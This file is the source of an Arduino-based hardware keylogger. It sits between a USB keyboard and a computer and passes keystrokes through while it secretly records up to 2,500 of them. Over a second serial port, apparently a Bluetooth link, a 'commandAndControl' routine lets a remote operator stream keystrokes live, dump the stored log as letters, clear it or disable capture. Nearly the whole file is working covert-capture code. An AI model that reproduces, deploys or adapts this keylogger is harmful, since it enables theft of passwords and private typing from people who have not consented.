#include <avr/pgmspace.h>

#include <avrpins.h>
#include <max3421e.h>
#include <usbhost.h>
#include <usb_ch9.h>
#include <Usb.h>
#include <usbhub.h>
#include <avr/pgmspace.h>
#include <address.h>
#include <hidboot.h>

#include <printhex.h>
#include <message.h>
#include <hexdump.h>
#include <parsetools.h>

#include "HID.h"

#define KEY_UP 0

#define KEY_DOWN 1

#define LOG_SIZE 2500
uint8_t keyBuf[LOG_SIZE];
uint8_t modBuf[LOG_SIZE];
int keysStored = 0;

#define  RT_MODE 1
#define  SAVE_MODE 0
#define  COMMAND_MODE 2
#define  DISABLED 3
 


int globalMode;

void storeKey(uint8_t key, uint8_t mod);

void printKey(uint8_t key, uint8_t mod);

void printLog();

void commandAndControl(char command)
{
  switch(command)
 {
   case '?':
    Serial1.println(" ");
    Serial1.println("Help screen");
    Serial1.println(" c = command mode (2)");
    Serial1.println(" d = disable mode (3)");
    Serial1.println(" i = info");
    Serial1.println(" p = print log");
    Serial1.println(" r = realtime mode (1)");
    Serial1.println(" s = save mode (0 default)");
    Serial1.println(" z = clear / zero memory");
    Serial1.println(" ? = help");    
    break;
    
   case 'i':
     Serial1.println("Keys Stored");
     Serial1.println(keysStored);
     Serial1.println("Mode");
     Serial1.println( (int) globalMode);
     break;
     
   case 'c':
     Serial1.println("Command mode"); 
     globalMode = COMMAND_MODE;
     break;
     
   case 'd':
     Serial1.println("Disable mode"); 
     globalMode = DISABLED;
     break;
     
   case 'r':
     Serial1.println("RealTime mode"); 
     globalMode = RT_MODE;
     break;
     
   case 's':
     Serial1.println("Save mode"); 
     globalMode = SAVE_MODE;
     break;
     
   case 'z':
     Serial1.println("Clearing log");
     keysStored = 0;
     break;
     
   case 'p':
     Serial1.println("Print log");
     printLog();
     break;
 } 
}

void printLog()
{
  int keysToPrint;
  if (keysStored > LOG_SIZE)
     keysToPrint = LOG_SIZE;
  else
     keysToPrint = keysStored;
  
  for(int i = 0; i < keysToPrint; i++)
    printKey(keyBuf[i], modBuf[i]); 
}

class KbdRptParser : public KeyboardReportParser
{
        void PrintKey(uint8_t mod, uint8_t key);
        
protected:
	virtual void OnKeyDown	(uint8_t mod, uint8_t key);
	virtual void OnKeyUp	(uint8_t mod, uint8_t key);
	virtual void OnKeyPressed(uint8_t key);
};

void PrintHexSerial1(uint8_t val)
{
    uint8_t    mask = (((uint8_t)1) << (((sizeof(uint8_t) << 1) - 1) << 2));
    
    while (mask > 1)
    {
		if (val < mask)
		  Serial1.print("0");

		mask >>= 4;
    }
    Serial1.print((uint8_t)val, HEX);
}

void KbdRptParser::PrintKey(uint8_t m, uint8_t key)	
{
    MODIFIERKEYS mod;
    *((uint8_t*)&mod) = m;
    Serial.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
    Serial.print((mod.bmLeftShift  == 1) ? "S" : " ");
    Serial.print((mod.bmLeftAlt    == 1) ? "A" : " ");
    Serial.print((mod.bmLeftGUI    == 1) ? "G" : " ");
    
    Serial.print(" >");
    PrintHexSerial1(key);
    Serial.print("< ");

    Serial.print((mod.bmRightCtrl   == 1) ? "C" : " ");
    Serial.print((mod.bmRightShift  == 1) ? "S" : " ");
    Serial.print((mod.bmRightAlt    == 1) ? "A" : " ");
    Serial.println((mod.bmRightGUI    == 1) ? "G" : " ");
};

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)	
{
    uint8_t buffer[4];
    
    buffer[0] = 0xFF;
    buffer[1] = KEY_DOWN;
    buffer[2] = key;
    buffer[3] = mod;
    Serial.write(buffer, 4);
    
    storeKey(key, mod);
    
    return;
    
}

void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)	
{
    uint8_t buffer[4];
    
    buffer[0] = 0xFF;
    buffer[1] = KEY_UP;
    buffer[2] = key;
    buffer[3] = mod;
    Serial.write(buffer, 4);
    
    
    
    return;
}

void printKey(uint8_t key, uint8_t m)
{
   
  
  MODIFIERKEYS mod;
    *((uint8_t*)&mod) = m;
    Serial1.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
    Serial1.print((mod.bmLeftShift  == 1) ? "S" : " ");
    Serial1.print((mod.bmLeftAlt    == 1) ? "A" : " ");
    Serial1.print((mod.bmLeftGUI    == 1) ? "G" : " ");
    
    Serial1.print(" >");
    
    if ( (key >= HID_KEYBOARD_SC_A) &&
        (key <= HID_KEYBOARD_SC_Z) )
   {
     Serial1.write('a' + key - HID_KEYBOARD_SC_A);     
   }
   
    Serial1.print("< ");

    Serial1.print((mod.bmRightCtrl   == 1) ? "C" : " ");
    Serial1.print((mod.bmRightShift  == 1) ? "S" : " ");
    Serial1.print((mod.bmRightAlt    == 1) ? "A" : " ");
    Serial1.println((mod.bmRightGUI    == 1) ? "G" : " ");
  
  return;
  
  
  
  
  if ( (key >= HID_KEYBOARD_SC_A) &&
        (key <= HID_KEYBOARD_SC_Z) )
   {
     Serial1.write('a' + key - HID_KEYBOARD_SC_A);     
   }
  
  
}

void storeKey(uint8_t key, uint8_t mod)
{
   if (globalMode == RT_MODE)
   {
     printKey(key, mod);
   }
   
   if (globalMode == SAVE_MODE)
   {
     #define LOG_SIZE 2500
      keyBuf[keysStored % LOG_SIZE] = key;
      modBuf[keysStored % LOG_SIZE] = mod;
      keysStored++;

   }
}

void KbdRptParser::OnKeyPressed(uint8_t key)	
{
    Serial.print("ASCII: ");
    Serial.println((char)key);
};

USB     Usb;
//USBHub     Hub(&Usb);
HIDBoot<HID_PROTOCOL_KEYBOARD>    Keyboard(&Usb);

uint32_t next_time;

KbdRptParser Prs;

void setup()
{
    Serial.begin( 115200 );
    Serial1.begin (38400);
    
    //Serial.println("Start");

    if (Usb.Init() == -1)
        Serial.println("OSC did not start.");
      
    delay( 200 );
  
    next_time = millis() + 5000;
  
    Keyboard.SetReportParser(0, (HIDReportParser*)&Prs);
}

void loop()
{
    Usb.Task();
    
    // read from port 0, send to port 1:
  if (Serial.available()) 
  {
    int inByte = Serial.read();
    Serial.write(inByte);
    Serial1.write(inByte); 
    //Serial.print("Sent to BT:  ");
    //Serial.println(inByte);

  }
  // read from port 1, send to port 0:
  if (Serial1.available()) 
  {
    char inByte = Serial1.read();
    commandAndControl(inByte);
  } 
}

